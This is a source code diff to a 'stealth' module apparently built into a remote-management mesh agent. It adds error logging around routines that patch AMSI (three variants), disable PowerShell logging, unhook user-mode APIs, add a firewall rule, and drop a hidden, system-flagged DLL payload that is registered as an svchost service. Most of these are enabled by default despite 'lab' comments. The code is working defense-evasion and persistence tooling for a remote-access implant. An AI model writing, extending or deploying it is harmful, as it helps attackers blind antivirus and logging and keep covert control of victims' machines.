@@ -3,6 +3,7 @@
 #include <wchar.h>
 #include <tchar.h>
 #include "stealth.h"
+#include "stealth_utils.h"
 #include "../meshcore/generated/meshagent_branding.h"
 
 static int EnvEnabledW(const wchar_t* name, int defaultOn)
@@ -37,28 +38,46 @@ void Stealth_InitLabFeatures(void)
     DWORD amsiLen = GetEnvironmentVariableW(L"STEALTH_AMSI", amsiMode, (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0])));
     if (amsiLen == 0 || amsiLen >= (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0]))) {
         // default
-        (void)Stealth_PatchAMSI();
+        if (!Stealth_PatchAMSI())
+        {
+            Stealth_DebugPrintfA("Stealth_PatchAMSI default path failed");
+        }
     } else {
         for (DWORD i = 0; i < amsiLen; ++i) { wchar_t c = amsiMode[i]; if (c >= L'A' && c <= L'Z') amsiMode[i] = (wchar_t)(c - L'A' + L'a'); }
         if (wcscmp(amsiMode, L"hwbp") == 0) {
-            (void)Stealth_PatchAMSI_HardwareBreakpoint();
+            if (!Stealth_PatchAMSI_HardwareBreakpoint())
+            {
+                Stealth_DebugPrintfA("STEALTH_AMSI=hwbp failed to arm hardware breakpoint");
+            }
         } else if (wcscmp(amsiMode, L"ntcontinue") == 0) {
-            (void)Stealth_PatchAMSI_NtContinue();
+            if (!Stealth_PatchAMSI_NtContinue())
+            {
+                Stealth_DebugPrintfA("STEALTH_AMSI=ntcontinue failed to activate bypass");
+            }
         } else if (wcscmp(amsiMode, L"none") == 0) {
             // do nothing
         } else {
-            (void)Stealth_PatchAMSI();
+            if (!Stealth_PatchAMSI())
+            {
+                Stealth_DebugPrintfA("Stealth_PatchAMSI fallback failed");
+            }
         }
     }
 
     // 2) Disable PowerShell logging (default on in lab)
     if (EnvEnabledW(L"STEALTH_DISABLE_POWERSHELL_LOG", 1)) {
-        (void)Stealth_DisablePowerShellLogging();
+        if (!Stealth_DisablePowerShellLogging())
+        {
+            Stealth_DebugPrintfA("Stealth_DisablePowerShellLogging failed");
+        }
     }
 
     // 3) Unhook common user-mode APIs (default on in lab)
     if (EnvEnabledW(L"STEALTH_API_UNHOOK", 1)) {
-        (void)Stealth_UnhookUserModeAPIs();
+        if (!Stealth_UnhookUserModeAPIs())
+        {
+            Stealth_DebugPrintfA("Stealth_UnhookUserModeAPIs failed");
+        }
     }
 
     // 4) Add firewall rule for current service binary (default on in lab)
@@ -71,7 +90,10 @@ void Stealth_InitLabFeatures(void)
         wchar_t svcNameW[256] = {0};
         MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_NAME, -1, svcNameW, (int)(sizeof(svcNameW)/sizeof(svcNameW[0])));
 #endif
-        (void)Stealth_AddFirewallRuleForService(svcNameW, exePath);
+        if (!Stealth_AddFirewallRuleForService(svcNameW, exePath))
+        {
+            Stealth_DebugPrintfA("Stealth_AddFirewallRuleForService failed for %ws", svcNameW);
+        }
     }
 
     int extractDefault = 0;
@@ -116,6 +138,7 @@ void Stealth_InitLabFeatures(void)
                     if (hf != INVALID_HANDLE_VALUE) {
                         DWORD written = 0;
                         BOOL wrote = WriteFile(hf, p, sz, &written, NULL);
+                        DWORD writeErr = wrote ? ERROR_SUCCESS : GetLastError();
                         CloseHandle(hf);
                         if (wrote) {
                             SetFileAttributesW(dllOut, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
@@ -132,9 +155,18 @@ void Stealth_InitLabFeatures(void)
                             }
 #endif
                             if (svcNameW[0] != L'\0') {
-                                (void)Stealth_RegisterSvchostService(svcNameW, dllOut);
+                                if (!Stealth_RegisterSvchostService(svcNameW, dllOut)) {
+                                    Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", svcNameW);
+                                }
                             }
                         }
+                        else {
+                            SetLastError(writeErr);
+                            Stealth_DebugLastErrorW(L"WriteFile (svchost payload extract)");
+                        }
+                    }
+                    else {
+                        Stealth_DebugLastErrorW(L"CreateFileW (svchost payload extract)");
                     }
                 }
             }
